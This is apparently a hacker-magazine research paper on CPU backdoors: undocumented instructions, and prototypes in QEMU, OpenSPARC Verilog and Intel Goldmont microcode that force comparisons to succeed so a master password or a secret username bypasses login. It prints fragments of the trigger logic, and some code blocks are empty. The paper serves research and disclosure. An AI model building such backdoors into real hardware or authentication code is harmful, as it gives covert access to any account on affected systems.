--[ 1. Introduction

The concept of CPU backdoors is both fascinating and controversial. While
their existence is often debated, it's hard to believe that the major CPU
vendors (like Intel, AMD, ARM and IBM) or certain agencies have never
considered them. An effective CPU backdoor must be undetectable and
lethal, reserved only for breaching the most secure systems as a last
resort.

Current discussions often focus on undocumented instructions. The problem
is, those still require the attacker to already have some foothold in the
system. Instead, what if a backdoor embedded deep within the processor's
microarchitecture, could grant access to a system without requiring any
prior compromise?

Certainly, components like the Baseboard Management Controller (BMC) and
Intel's Management Engine (ME), along with their underlying controlling
bus, can fully control a system at the deepest level. However, these
features are at least partially documented and typically fall under the
broader category of Reliability, Availability, and Serviceability (RAS).
Customers should already be well aware of the risks when their devices are
marketed as remotely manageable.

The goal of this project is to implant a CPU backdoor by altering
instruction implementations. It is not meant to make a destructive
"halt-and-catch-fire" instruction. This backdoor is designed to subtly
manipulate critical instructions such as "CMP" that are involved in password
authentication, to bypass system security checks.

Imagine an attacker sitting down at a secured machine he's never touched
before, or connecting remotely. By entering one secret master password, he
can gain access to any account on the system.

Years ago, a security researcher demonstrated an attack on an ATM running
Windows XP by exploiting an exposed FireWire port. This port allowed direct
memory access from the connected peer machine, bypassing Windows XP's login
mechanism.

This is how the Windows password authentication works: when Windows system
received a password input, it would pad the string and generate a 16-byte
NTLM hash, which the system compared against stored credentials in the SAM
database via the MsvpPasswordValidate() function within msv1_0.dll.

By accessing the system's memory through the FireWire interface, the
attacker could patch the validation function to always return "true"
(rendering all passwords valid) or embed a predetermined hash to accept a
specific master password. This memory-level manipulation completely
circumvented Windows XP's security measures, granting unrestricted access
to any system account.

Surprisingly, the hash used is unsalted. Even Windows 10 still relies on
unsalted hashes (I haven't tested Windows 11 yet, as none of my machines or
VMs meet its requirements, but I suspect the situation remains unchanged).
A CPU password backdoor would be especially convenient due to the
predictability of unsalted hashing.

One challenge for hardware-level backdoors is that CPU cores operate at a
lower abstraction layer, stripping away OS-level context during instruction
execution. However, it is notable that operating system authentication
module has remained largely unchanged for years (all NT-based Windows
systems use the same authentication mechanism and libraries as just
described above, at least from Windows XP to Windows 10), whether by
deliberate design or simply due to the robustness of their implementation.

For the backdoor design, malicious circuitry is embedded into the CPU's
Arithmetic Logic Unit (ALU). When a specific hash value is compared, the
malicious circuitry manipulates the ALU to produce a false result, forcing
it to return a match regardless of the actual comparison. This manipulation
is triggered when the ALU operation originates from a CMP instruction
executed by the password authentication module (64-bit hashes derived from
the secret master key prevent false triggers). As a result, the master key
will be accepted as valid for any stored credentials, bypassing
authentication checks.

To validate this concept, I employed QEMU with TCG (Tiny Code Generator) to
demonstrate the backdoor on a virtual x86 machine running Windows.

To further verify the backdoor's feasibility on commercial hardware, I
implemented it in Verilog RTL for the OpenSPARC T1 (Sun Microsystems'
open-source UltraSPARC T1 variant) and deployed it on a Xilinx ML505
(Virtex-5 LX110T) FPGA board. This FPGA implementation enabled
cycle-accurate verification of the backdoor on actual CPU hardware.

Since Windows does not support SPARC-based systems, I installed a Linux
distribution instead and made adjustments to the backdoor. In Linux and
other Unix-like systems, the use of salted password hashes complicates
backdoor implementation. The salt prevents the CPU from directly
recognizing predefined hash values, but the username transmitted in
cleartext can still serve as an alternative trigger.

A microcode-based prototype was also implemented on an Intel Pentium N4200
CPU (Goldmont microarchitecture) to validate the concept on commercial
hardware.

This paper is structured in three main sections. We begin by discussing
existing CPU backdoors to establish necessary background knowledge. Next,
we introduce and demonstrate our novel CPU backdoor design. Finally, we
discuss and conclude with our insights.


--[ 2. Known CPU "Backdoors"

When discussing CPU "backdoors," hidden instructions are a common concern.
For example, a single malicious instruction might grant the highest system
privileges. While CPU manufacturers document most instructions,
undocumented instructions do exist [5][6][7][8]. Actually, since all
instructions must comply the processor's encoding rules, it is not
difficult to enumerate all undocumented opcodes. These could either be
valid but undocumented instructions or simply reserved opcode space for
future use.

However, variable-length instruction sets (like x86) add complexity.
Undocumented extension bytes could exist, expanding the available encoding
space and potentially concealing more hidden opcodes.

The following is a portion of Intel's 2-byte opcode map for instructions
that start with the escape code 0F. The second byte is determined by its
row and column position in the map. For example, the INVD instruction
corresponds to 0F08, while WBINVD is encoded as 0F09. Some instructions
also require a prefix. VMOVAPD, for instance, is represented as 660F28,
where 66 is the prefix, 0F is the escape code, and 28 is the second byte
derived from the opcode map.

The opcode map includes several unassigned entries, such as 0F 0A, which
may indicate either undocumented or invalid instructions. Another example
is 0F 3F in the bottom-right corner, also left blank in Intel's
documentation. However, this particular opcode holds significance in VIA's
x86 CPUs, where it encodes the ALTINST (Alternate Instruction). While VIA's
manuals confirm the existence of ALTINST, they provide minimal technical
details, leaving the alternate instruction set largely undisclosed.

The seventh row of the map includes entries labeled "3-byte escape," which
denote instructions starting with the escape sequences 0F 38 or 0F 3A. To
enumerate these instructions, the corresponding 3-byte opcode map is
needed.

Although Intel's documentation suggests that 3-byte opcodes is the current
maximum length, nothing prevents additional escape codes in further bytes.
Notably, the gap between 0F 38 and 0F 3A, which is the unassigned 0F 39
raises intriguing questions: Is this an undocumented instruction, or could
it be an undocumented escape prefix?  Similar question arise with other
blank entries in the map.

Some CPU instructions have hidden functionalities that are unlocked only
when specific values are set in registers. While the base instruction is
documented, its full capabilities may remain undisclosed unless the right
"key" (a particular register value) is provided.

For example, the CPUID instruction retrieves CPU information based on
register inputs, behaving like a standard feature. However, what if certain
register values could unlock deeper, undocumented functions? AMD CPUs
already use this method for some debugging features.

This approach has advantages. The instruction behaves normally without the
correct register value, its hidden functionality remains undetectable
unless the precise activation code is provided. Additionally, the risk of
accidental execution is minimal, especially on 64-bit systems, where the
chances of randomly entering the correct 64-bit "key" are very low.


----[ 2.1 VIA C3 ALTINST Instructions

The VIA C3 processor has a unique instruction called ALTINST[9] (encoded as
0F 3F), which serves as an entry point to an undocumented alternate
instruction set. While the C3 technical manual acknowledges the existence
of this instruction set, it provides no further details. The manual
says: "This alternate instruction set is intended for testing, debugging,
and specialized applications. As such, it is not documented for general
use. If access to these instructions is required, contact your VIA
representative." However, research[10] and patents[11][12][13][14] suggest
that the VIA C3's ALTINST opcode unlocks an undocumented RISC-like
microcode ISA that bypasses x86 privilege enforcement, allowing ring 3 code
to execute ring 0 operations and circumvent memory protection checks.

To enable the alternate instruction set, the ALTINST bit must first be set
to 1 in the Feature Control Register (FCR) via WRMSR. If disabled
(ALTINST=0), executing the 0F 3F opcode triggers an Invalid Instruction
(#UD) exception. Once enabled, executing 0F 3F performs a near branch to
CS:EAX while simultaneously switching the processor into an internal mode,
interpreting subsequent instructions as the microcode and bypassing
standard privilege checks.

After executing the 0x0F3F gateway instruction, the processor expects
alternate instructions to be encoded within an LEA [EAX+EAX+disp32] opcode
sequence (0x8D8400XXXXXXXX), where the 32-bit displacement field (XXXXXXXX)
contains the actual micro-operation. The CPU internally extracts and
executes this payload while discarding the x86 LEA wrapper. This encoding
scheme is clever, because disassemblers typically interpret 0x0F3F as a NOP
instruction. The following bytes are then processed as a standard x86 LEA
operation, effectively concealing the alternate instruction stream within
what appears to be normal x86 code.


----[ 2.2 AMD Secret Password 0x9C5A203A

Model-Specific Registers (MSRs) are specialized control registers in the
x86 architecture, designed for tasks such as debugging, execution tracing,
performance monitoring, and enabling or disabling specific CPU features.
Access to these registers is performed using the RDMSR and WRMSR
instructions, which reference the target MSR via a 32-bit index.

Although most MSRs are documented, certain processors, particularly AMD's
Opteron (K8 microarchitecture), have undocumented MSRs that require
password to access. For example, on those processors, the password
0x9C5A203A unlocks hidden debugging functionality.  According to internet
user Czernobyl[15], these undocumented MSRs are primarily used for
low-level debugging. To activate this feature, the password must first be
loaded into the EDI register. Failure to do so triggers a General
Protection Fault (GPF) exception.

An AMD white paper titled "Live Migration with AMD-V Extended Migration
Technology"[4] references password-protected MSRs. The document includes a
code example (shown below) demonstrating how a hypervisor or operating
system can disable reporting of the RDTSCP instruction on Second-Generation
AMD Opteron processors:

</PRE>
```adm
/*
 * Example 3: Use MSR C001_1005 to clear bit 27 (RDTSCP) reported in
 * EDX after CPUID Function 8000_0001
 */

        /*
         Read current value of the CPUID Override MSR C001_1005.
         After RDMSR completes, EDX:EAX contains the 64bit MSR value.
         EDX is loaded with the high 32 bits of the MSR and EAX is loaded
         with the low 32 bits. The low 32 bits of this MSR are returned in
         EDX after CPUID Function 8000_0001
        */

        /*
         Write the new EDX:EAX value into CPUID override MSR.
         Second-Generation AMD Opteron Processors require a
         32 bit password in EDI. Contact AMD to get the password.
        */

                MOV EDI, <PASSWORD>

                MOV CX, 0xC0011005h
                RDMSR

        /*
         Clear bit 27 (RDTSCP) of EAX register
        */

                ANDL EAX, 0xF7FFFFFFh
                WRMSR
```
<PRE>

According to the white paper, the password (0x9C5A203A) is only necessary
for writing a specific bit in MSR c0011005h — a register that enables
access to additional undocumented features. While the document mentions
that the password must be obtained directly from AMD, it was accidentally
revealed in another whitepaper[34].


----[ 2.3 Candidate Backdoor Instructions

The OR instruction is part of the IBM Power ISA[19]. The basic operation is
defined as:

"or RA,RS,RB: The contents of register RS are ORed with the contents of
register RB and the result is placed into register RA. Some forms of or
Rx,Rx,Rx provide special functions; see Section 3.2 and Section 4.3.3, both
in Book II."

This appears to be a normal OR instruction with register operands. However,
when all three operands reference the same register (effectively performing
a NOP), it activates hidden system functions, such as adjusting process
priorities or issuing cache hints. For example, executing "or 2, 2, 2"
(using general-purpose register 2) silently sets the process priority to
"medium," appearing harmless while triggering background behavior.

Imagine if this instruction had hidden functionality, like adjusting
current privileges, then it could serve as a convenient backdoor.


--[ 3. Designing a CPU Backdoor

The known backdoors discussed earlier, along with proposed ideas [3][18],
require the attacker to already possess code execution capabilities within
the system. However, obtaining initial access often presents the greatest
challenge. To address this, we consider the login process. Password
authentication, a foundational security mechanism, relies on users
submitting credentials (username and password) for verification. However,
even robust password authentication fails if the CPU itself is backdoored,
enabling attackers to bypass verification silently.


----[ 3.1 Windows Password Authentication Bypass via Backdoored Instruction

Windows password authentication works as follows. During login, user
password is padded and hashed to 16 bytes using NTLM algorithm. The
MsvpPasswordValidate() function from msv1_0.dll then compares this hash
with the one stored in the SAM database using RtlCompareMemory(). If they
match, authentication succeeds. Below is the disassembly of
RtlCompareMemory():

</PRE>
```asm
 ntdll!RtlCompareMemory:
 76ff6970 56 push esi
 76ff6971 57 push edi
 76ff6972 fc cld

 76ff69b0 8bc6 mov eax,esi
 76ff69b2 5f pop edi
 76ff69b3 5e
```
<PRE>

Since the hash data is exactly 16 bytes long and system-allocated memory is
typically word-aligned, RtlCompareMemory() optimizes the comparison
process. On 32-bit x86 systems, it performs four 32-bit (DWORD) comparisons
using REPE CMPSD, while on 64-bit x86 systems, it executes two 64-bit
(QWORD) comparisons via REPE CMPSQ, as shown below.

 x86
 "f3a7   repe cmps dword ptr [esi],dword ptr es:[edi]"

 x86_64
 "f348a7  repe cmps qword ptr [rsi],qword ptr [rdi]"


The esi and edi registers store the memory addresses of the two hash values
being compared, while ecx contains the number of comparisons to perform.
The repe (or repz) prefix instructs the CMPS instruction to repeat until
either ecx reaches zero or a mismatch is detected.In the Windows password
authentication process, CMPS functions as the decisive instruction. Its
result directly determines whether authentication passes or fails.

Consider the password "123" as the secret master password. Its
corresponding hash is "3dbde697d71690a769204beb12283678". During the REPE
CMPS instruction on x86 systems, the edi register contains the memory
pointer and sequentially reads the data values 0x97e6bd3d, 0xa79016d7,
0xeb4b2069, and 0x78362812.  On x86_64 systems, this data is organized in
64-bit thunks as 0xa79016d797e6bd3d and 0x78362812eb4b2069. When the
backdoored CPU processes these specific values during a CMPS operation, it
will set the Z flag to indicate a match, regardless of the actual memory
content. As a result, the password "123" will successfully authenticate
against any password stored in the system.

The REPE CMPS instruction is relatively complex. It involves memory
accesses and multiple arithmetic operations. For instance, the data
comparison is essentially a subtraction operation carried out by the ALU.
In real x86 processors, it will be decoded into microcode routines stored
in the CPU's microcode ROM, which then executes the corresponding sequence
of micro-operations.


----[ 3.2 x86 QEMU TCG-based Prototype

I truly wish I could implement this backdoor on a x86 CPU. However, I
haven't found an open-source x86 processor capable of running the Windows
NT kernel, and developing one myself is beyond my current capabilities
(though I'm studying the ao486_MiSTer project). For now, I'll demonstrate
the backdoor using QEMU's TCG emulator instead.

(Three years later, I'm still working towards my x86-core goal.
Fortunately, microcode has become far more accessible, allowing me to
prototype a microcode-based backdoor as well. Full details are in Section
3.4.)

TCG (Tiny Code Generator) is QEMU's dynamic binary translation engine.
Instead of interpreting instructions one by one (like Bochs), TCG
translates target CPU instructions into intermediate TCG ops, which are
then compiled into host machine code. This approach, called Dynamic Binary
Translation, delivers significantly better performance than traditional
interpreters while still being software-based.

To understand how TCG translates machine code, we begin with disas_insn()
which is the core function that decodes CPU instructions into TCP ops:

 static target_ulong disas_insn (DisasContext *s, CPUState *cpu);


Located in target/i386/tcg/translate.c, this implementation handles both
x86 and x86_64 architectures. The disas_insn() function uses a large
switch-case structure for instruction decoding. Within it, opcode 0xa7 maps
to the CMPS instruction with dword operands, as illustrated below.

</PRE>
```c
 case 0xa6: /* cmpsS */
 case 0xa7:
     ot = mo_b_d(b, dflag);
     if (prefixes & PREFIX_REPNZ) {
         gen_repz_cmps(s, ot, pc_start - s->cs_base,
                       s->pc - s->cs_base, 1);
     } else if (prefixes & PREFIX_REPZ) {
         gen_repz_cmps(s, ot, pc_start - s->cs_base,
                       s->pc - s->cs_base, 0);
     } else {
         gen_cmps(s, ot);
     }
     break;
```
<PRE>

gen_cmps() handles standalone CMPS instruction, while gen_repz_cmps()
processes REP-prefixed CMPS operations by repeatedly invoking gen_cmps()
for each iteration. The implementation is shown below.

</PRE>
```c
 static inline void gen_cmps(DisasContext *s, MemOp ot)
 {
     gen_string_movl_A0_EDI(s);
     gen_op_ld_v(s, ot, s->T1, s->A0);
     gen_string_movl_A0_ESI(s);
     gen_op(s, OP_CMPL, ot, OR_TMP0);
     gen_op_movl_T0_Dshift(s, ot);
     gen_op_add_reg_T0(s, s->aflag, R_ESI);
     gen_op_add_reg_T0(s, s->aflag, R_EDI);
 }
```
<PRE>

It is constructed using TCG front-end operations, which consist of
functions beginning with tcg_ such as tcg_gen_mov_tl(). These operations
represent fundamental CPU instructions and are directly translated into
host machine code during JIT compilation, functioning similarly to
microcode in real x86 CPU. For more complex instruction emulation that
cannot be efficiently represented with basic TCG operations, TCG provides a
helper function mechanism. These helpers are implemented as C functions
that are called from TCG-generated code, allowing complex operations to be
executed as precompiled native binary for optimal performance. By using
helper functions for complicated cases, TCG avoids the need to express
sophisticated logic through TCG ops while maintaining execution speed.

The helper function gen_helper_malicious_cmps() implements backdoor logic
that checks if the memory pointed to by edi/rdi matches predefined master
password hashes. If a match is found, gen_malicious_op() alters the result

The master password '123' will authenticate successfully once the REPE CMPS
instruction completes its comparison with all hash fragments. This means
that on this QEMU virtual machine, as long as it runs a Windows NT-based
system, the password '123' can be used to access any user account.


--[ 3.3 SPARC64 Backdoor Prototype on OpenSPARC T1 FPGA

To validate the backdoor's feasibility on real hardware, we implemented a
prototype on the OpenSPARC T1 processor. OpenSPARC T1 is the open-source
version of Sun Microsystems' UltraSPARC T1 (codenamed Niagara), featuring a
single-issue, in-order, 6-stage pipeline with multicore and multithreading
support. Its source code is publicly available under the GNU General Public
License v2.

For testing, we used Xilinx's OpenSPARC Evaluation Platform
(ML505-V5LX110T), an FPGA board designed to emulate a full OpenSPARC T1
system, including the CPU, DDR memory controller, Ethernet interfaces, and
other peripherals. This setup, leveraging the open-source RTL and
FPGA-based emulation, provides the closest possible approximation to
testing on a commercial CPU.


----[ 3.3.1 *nix Password Authentication Analysis

The OpenSPARC project offers SunOS 5.11 and Ubuntu 7.10 ramdisk images for
the FPGA-emulated system. Both operating systems run a 64-bit kernel but
restrict user-mode programs to 32-bit execution. As noted in the SPARC
Assembly Language Reference Manual [2], certain 64-bit registers remain
accessible to 32-bit programs: "The global registers and output registers
can store full 64-bit integer values, while the input and local registers
are limited to 32-bit values in the lower half."

In Ubuntu 7.10's 32-bit libc-2.6.1.so, the strcmp() function leverages
64-bit registers for string comparisons. When memory addresses are
word-aligned, it uses the CMP instruction with 64-bit register operands to
perform efficient comparisons. As illustrated in the following assembly
snippet, LDXA loads 64-bit data into the registers (o2 and o3), which are
then compared using CMP:

</PRE>
```asm

```
<PRE>

I also analyzed Debian 9.0 SPARC64 and found that its libpam and libc
implementations closely resemble those in Ubuntu 7.10 SPARC32+. However, in
Debian 9.0, strcmp() uses the XOR instruction for data comparison instead
of CMP. This subtle change would make the backdoor ineffective if it
exclusively targets on the CMP instruction. That said, this is only a minor
issue for CPU vendors. They could either encourage compiler developers to
favor a specific instruction or implement the backdoor for both cases.
After all, only a few instructions are capable of performing data
comparisons.

Unlike Ubuntu, SunOS 5.11's libc is limited to 32-bit operands. For
simplicity, this analysis only focuses on Ubuntu.

In Ubuntu 7.10, user authentication is implemented through libpam
(Pluggable Authentication Modules), which also verifies passwords by
comparing hash strings. Our backdoor specifically exploits the CMP
instruction in this verification process.

Like most Linux distributions, Ubuntu 7.10 supports multiple hash
algorithms, such as MD5 and SHA256. The following example demonstrates two
hash strings, where the numeric value between the first two dollar signs
indicates the algorithm used for each hash (MD5: $1$, SHA-256: $6$):

</PRE>
```text
 "root:$1$7c71xB0y$mPkMSwwbMWgEXsyD6YV/C1:14168:0:99999:7:::"

 "u:$6$zE3nVD4laY6MS31E$NK4TnaebdS.O9FX9Q.pg7/yH.fH5bi8bHCFJdFbEaPtmW/59KKB
  7JDk53W21ZoLnKhrkmB4u5cXE.9ynmeIEw0:18811:0:99999:7:::"
```
<PRE>

Additionally, *nix systems commonly use salt in password hashing to
strengthen security. For example, an MD5 hash string follows the format
$1$&ltlsalt>$&lt;hash>, where $1$ indicates the hashing algorithm, &lt;salt> is a
random value, and &lt;hash> is the resulting salted password hash.

Salting ensures that even one password produce millions of significantly
different hashes, making precomputation attacks (like rainbow tables)
infeasible, since storing every possible salted hash would be impractical.

The CPU backdoor faces the same issue: it cannot compare against all salted
hashes to identify one master password. However, during password
authentication, the CPU can still read the username in cleartext.

Our approach uses unique usernames to enable or disable the backdoor. For
instance, entering the secret username "00000000" will enable the backdoor.
After that, the CMPS instruction will return a match for all subsequent
hash string comparisons until the backdoor is disabled again. During this
period, an attacker can log in to any account using any password.

The secret username should be 8 bytes long, ensuring it fits precisely into
a 64-bit register. During password authentication, libpam first verifies
the username against entries in /etc/passwd, where the default first entry
is usually "root". When comparing the input "00000000" with the stored
"root" entry, the CPU executes a "CMP reg-rs1, reg-rs2" instruction. In
this case, reg-rs1 holds 0x726f6f7400000000, which corresponds to the ASCII
encoding of "root" followed by null padding to fill the 8-byte register.
Meanwhile, reg-rs2 contains 0x3030303030303030, the ASCII representation of
"00000000".

When these two values are compared, the CPU then examines subsequent hash
comparisons. It specifically looks for a pattern where both the rs1 and rs2
registers contain values beginning with "$1$".

Here is how *nix password authentication works. The crypt() function
generates the hash value. libpam passes both the user-input password and
the hash string stored in the /etc/shadow file to crypt(), as illustrated
in the following code:

</PRE>
```c
 char * crypt(const char *phrase, const char *setting);

 // stored_hash: e.g., "$1$7c71xB0y$mPkMSwwbMWgEXsyD6YVC1"
 pp = crypt("password_input", stored_hash);
```
<PRE>

The function returns a pointer to the newly generated hash string, which is
then compared to the stored hash string using strcmp():

</PRE>
```c
 ret = strcmp(pp, stored_hash);
```
<PRE>

The compared strings include both the hash type identifier and the salt
string. This explains why the backdoor checks for values beginning with
$1$, as previously mentioned.

For each subsequent CMP instruction that compares fragments of the hash,
the CMP instruction must produce a match until the final piece of the hash
is processed. Normally, a null byte (0x00) marks the end of a string, but
the actual length can vary depending on the hash function and salt size.

For simplicity, this backdoor prototype is specifically designed to work
with MD5 hashes.


----[ 3.3.2 Backdoor Implementation in RTL

The OpenSPARC T1 is a single-issue, in-order, multi-threaded processor
implemented in Verilog. Its main pipeline consists of six stages: Fetch,
Switch, Decode, Execute, Memory, and Writeback. The SPARC core supports
four strands (virtual processors), each equipped with a dedicated register
file.

The microarchitecture is organized into two main units: the Instruction
Fetch Unit (IFU) and the Execution Unit (EXU). The IFU handles the Fetch,
Switch, and Decode stages, managing instruction retrieval from cache or
memory, selecting the next strand for execution, and decoding instructions.
The EXU controls the Execute, Memory, and Writeback stages and contains four
functional units: the Arithmetic Logic Unit (ALU) for basic arithmetic and
logic operations, the Shifter (SHFT) for bit manipulation, the Integer
Multiplier (IMUL) for multiplication, and the Integer Divider (IDIV) for
division.

Other components such as the Load-Store Unit (LSU), responsible for memory
access operations, and the Trap Logic Unit (TLU), which manages exceptions
and interrupts.

Our backdoor is integrated into the ALU, targeting the CMP (SUBcc)
instruction. During execution, the malicious circuitry intercepts and
modifies the comparison (subtraction) operation between the two operands.
Below is the ALU module implementation:

The ALU module comprises two primary functional units: the
sparc_exu_alulogic unit for logical operations and the sparc_exu_aluaddsub
unit for arithmetic operations including addition and subtraction. The
backdoor specifically targets the comparison/subtraction instruction
execution path, which is processed through the sparc_exu_aluaddsub module.
The sparc_exu_aluaddsub code is shown below.

This module gets most of the signals required for the backdoor's operation.
The operands for comparison are provided via byp_alu_rs1_data_e and
byp_alu_rs2_data_e, while the operation type (addition or subtraction) is
determined by the control signals ecl_alu_cin_e and ifu_exu_invert_d.

The destination register index (rd) plays a important role in the backdoor
logic to prevent false matches. CMP is a pseudo-instruction. The assembly
code 'cmp reg rs1, reg_or_imm' is essentially equivalent to 'subcc reg rs1,
reg_or_imm, %g0', where the destination is the read-only %g0 register.
Thus, the "CMP" instruction discards the computation result while still
setting the condition flags. This distinction is vital for differentiating
between CMP operations and regular SUBcc instructions.

The rd field is encoded in the instruction word. To transfer it to the ALU,
we introduce a new signal, ecl_alu_rd_e, along with a corresponding
pipeline register in the sparc_exu_ecl module. This module manages control
logic and maintains pipeline registers.

The ecl_alu_rd_e signal is assigned during the decode stage, latched in the
pipeline registers, and then used by the ALU during the execute stage.

In hardware implementation, addition and subtraction are both implemented
as addition operations. The difference for subtraction lies in the use of
two's complement arithmetic: the subtrahend is inverted, incremented by
one, and then added to the first operand. The ifu_exu_invert_d signal
controls whether the second operand should be inverted, indicating a
subtraction in the Decode stage. This signal is then pipelined to the
Execute stage for use in the computation.

For a standard subtraction (SUB), the carry-in bit ecl_alu_cin_e is set to
1 to complete the two's complement operation. In contrast, for a
subtraction with carry (SUBC), the carry-in bit remains 0, allowing the
carry flag from the previous operation to affect the result. The SUBC
operation is processed by the space_exu_aluspr module, which outputs zero
if the two operations match.

When the backdoor is active and the ALU processes hash string comparisons,
both the sparc_exu_aluspr and sparc_exu_aluadder64 modules must output
zeros.

Below is the implementation of the sparc_exu_aluaddsub module containing
the backdoor logic.

As previously mentioned, the magic username "00000000" enables the
backdoor. The ALU asserts the backdoor_on_keyword signal upon detecting the
values 0x726f6f7400000000 and 0x3030303030303030 in both operands.
Conversely, when the username "00000001" is entered, it asserts
backdoor_off_keyword and deasserts backdoor_on_keyword, effectively
disabling the backdoor.

The ALU's combinational logic performs addition with the input control
signals, treating CMP and SUB operations identically. But the backdoor
logic must differentiate between them to reduce false positives. The
issubrd0 signal indicates that the current operation is a CMP, as shown
below.

</PRE>
```c
 assign issubrd0 = (5'h0 == ecl_alu_rd_e[4:0]) & sub_e & ecl_alu_cin_e;
```
<PRE>

The hash is split into 64-bit blocks and iteratively compared with its
counterparts. For example, this is a MD5 hash:

</PRE>
```text
 $1$7c71x        0x2431243763373178
 B0y$mPkM        0x423079246d506b4d
 SwwbMWgE        0x537777624d576745
 XsyD6YV/        0x587379443659562f
 C1              0x4331
```
<PRE>

The ALU signals hash_begin when it identifies the start of a hash segment
(beginning with $1$), while hash_00 indicates the end of the segment. The
intermediate section consists of printable ASCII bytes without a distinct
pattern. Note that the position of null bytes (0x00) depends on the hash
algorithm and salt length. For simplicity, this implementation only uses
MD5 hashes, and the hash length is fixed. The logic is illustrated below.

</PRE>
```c
 assign hash_begin = ((24'h243124 == byp_alu_rs1_data_e[63:40])
                   && (24'h243124 == byp_alu_rs2_data_e[63:40]))
                   & issubrd0;
 assign hash_00 = (8'h0 == byp_alu_rs1_data_e[47:40])
                & (8'h0 == byp_alu_rs2_data_e[47:40]);
 assign hash_end = hash_r & hash_00 & issubrd0;
```
<PRE>

When hash_r is active, it means the current operation is comparing a hash.
If issubrd0 (which flags a CMP instruction) is also high, this triggers
trigger_backdoor. Once activated, it forces both spr_out and adder_out to
zero, faking a successful match. The logic is shown below.

</PRE>
```c
 assign hash_en = (hash_begin | hash_end) & backdoor_r;
 assign hash_nxt = hash_begin & (~hash_end);

 dffe_s #(1) hash_dffe(.din(hash_nxt), .en(hash_en),
                      .clk(clk), .q(hash_r), .se(se),
                      .si(), .so());

 assign trigger_backdoor = (hash_r | hash_begin) & issubrd0;


 assign spr_out[63:0] = spr_out_tmp[63:0] & {64{~trigger_backdoor}};
 assign adder_out[63:0] = adder_out_tmp[63:0] & {64{~trigger_backdoor}};
```

The backdoor activates when the attacker attempts to log in with the
username "00000000," though this fails because the account does not exist.
Once triggered, the attacker can log into any valid account without
requiring a password. In this case, the attacker gains root access, as
shown in the log, receiving the "#" prompt with root privileges. To
deactivate the backdoor, the attacker must log in again using the username
"00000001."

This backdoor also works for SSH remote login as long as the SSH service
allows password authentication.


--[ 3.4 Intel Goldmont x86 Microcode-Based Backdoor Implementation

To validate the backdoor concept for x86, I developed a prototype using
QEMU's TCG. However, as a software emulation, it inevitably has
limitations. My long-term goal was to design my own x86 core, but that goal
is still far and remains ongoing. At the time, I considered microcode as an
alternative, but its inner mechanism were still too obscure. Now, in 2025,
three years after completing the earlier phase of this research, new
studies[30][20][23][27][32] have emerged, making microcode more accessible
than ever.


--[ 3.4.1 Microcode Basics

Microcode serves as an ideal middle ground between software emulation and
physical silicon hardware. It could also be the perfect hiding place for
real-world backdoors, embedded directly in the CPU, easy for vendors to
update, and capable of supporting sophisticated malicious
functionality[20].

The microcode format is not publicly documented and it is embedded in the
CPU's internal memory, with updates only available in encrypted packages.
However, AMD has a patent detailing their microcode implementation called
RISC86[21], used in the AMD-K6 processor. In my opinion, this is the most
detailed public document on the subject from a major CPU vendor. I am also
still learning, so I am not in a position to explain how microcode works.
But for context, I will provide a brief overview of microcode as I
understand it.

While x86 is classified as a CISC (Complex Instruction Set Computer)
architecture, in contrast to RISC (Reduced Instruction Set Computer),
modern x86 CPUs have internally used RISC-like micro-operations (uops)
since the Intel Pentium Pro and AMD K6 processors. These CPUs employ
multiple advanced instruction decoders to break down complex x86 CISC
instructions into simpler RISC-style microcode for execution.

Quote from an old AMD document[22]: "The AMD-K6 processor uses a
combination of decoders to convert x86 instructions into RISC86 operations.
The hardware includes four decoders:

Two parallel short decoders - These translate the most commonly used x86
instructions into zero, one, or two RISC86 operations each. They are also
designed to decode up to two x86 instructions per clock.

Long decoder - This handles commonly used x86 instructions that can be
represented in four or fewer RISC86 operations.

Vectoring decoder - This handles all other translations in concert with
RISC86 operation sequences fetched from an on-chip ROM."

Contemporary Intel processors now process complex instructions through the
Microcode Sequencer (MS). This unit retrieves micro-operations from the
Microcode Sequencer ROM (MSROM) and coordinates their dispatch to execution
units. Intel's Optimization Reference Manual (Section 22.5.7.2,
'Understanding the Sources of the Micro-op Queue') confirms that string
instructions are processed in this manner.

This means we could actually tweak how the CMPS instruction works. However,
accessing and altering x86 microcode has historically been a substantial
technical challenge due to Intel's proprietary security mechanisms.
Pioneering work by Ermolov, Sklyarov, and Goryachy has achieved critical
breakthroughs in this domain through their research on Intel's Goldmont
microarchitecture. Their research uncovered a critical vulnerability in TXE
firmware that permits arbitrary code execution and achieves privileged "red
unlock" status[23][24], effectively bypassing conventional microcode
security protections.

Furthermore, their discovery of previously undocumented UDBGRD/UDBGWR
instructions[30][26] provides direct access to the internal CRBUS (Control
Register Bus), enabling unprecedented low-level processor control.
Complementing these findings, the uCodeDisasm project[25] has made
substantial progress in decoding microcode semantics and identifying
numerous undocumented microarchitectural features and control registers.
All these efforts together have opened new avenues for deeper analysis of
processor internals.


--[ 3.4.2 CMPS Microcode Analysis

Identifying the microcode entry point for the CMPS instruction is
relatively straightforward due to its characteristic usage of architectural
registers. The instruction employs RCX as its loop counter while utilizing
RSI and RDI as string pointers. So, simply look for microcode associated
with RCX, RDI, and RSI and fits the three rules[25] for microcode entries.

1. The address for any x86 entry point is in the range U0000-U1000
2. The address for x86 instruction entry must be a multiple of 8
3. There must not be references in other places of ucode to the x86 entry
   address

The CMPS microcode entry is located at U08b0. Fortunately/Unfortunately, no
backdoor functionality exists, much to my disappointment, since I was
hoping for a major scandal. The microcode itself is quite basic, as shown
below.

The microcode binary was disassembled into assembly language using the
uCodeDisasm. Before analyzing the code, it is necessary to first establish
some fundamental concepts.

The microcode comprises fixed-length RISC instructions. In Intel's Goldmont
microarchitecture, these are 48-bit instructions grouped into sets of three
called Microcode Triads. Each triad is accompanied by a Sequence Word
(30-bit) that manages synchronization and memory fence attributes for the
micro-instructions within the triad and controls program flow by selecting
between sequential execution of the next triad, jumps to specified
microcode addresses, or termination of the current routine.

Below are the micro-instruction and sequence word formats. As I am still
studying their meanings, I will not provide a detailed explanation of each
field here. For comprehensive information, please refer to the foundational
documentation in uCodeDisasm[25] and lib-micro[27].

The code appears relatively simple at first glance. It continuously loads
data from memory locations pointed to by RSI and RDI, compares them, and
increments the memory addresses in these registers while decrementing the
counter value in RCX.

Let's clarify the following abbreviations:

ZX (Zero eXtended): Indicates zero-extension of a value.
DSZ (Data Size): Specifies the size of a data operand.
ASZ (Address Size): Denotes the size of an address operand.
SC (Scale): Represents the scaling factor in addressing calculations.

And the terms TAKEN and NOTTAKEN serve as branch hints for the Microcode
Sequencer.

For example:

 U3cc8: 1c0000231027 tmp1:= LDZX_DSZN_ASZ32_SC1(rdi, mode=0x08)

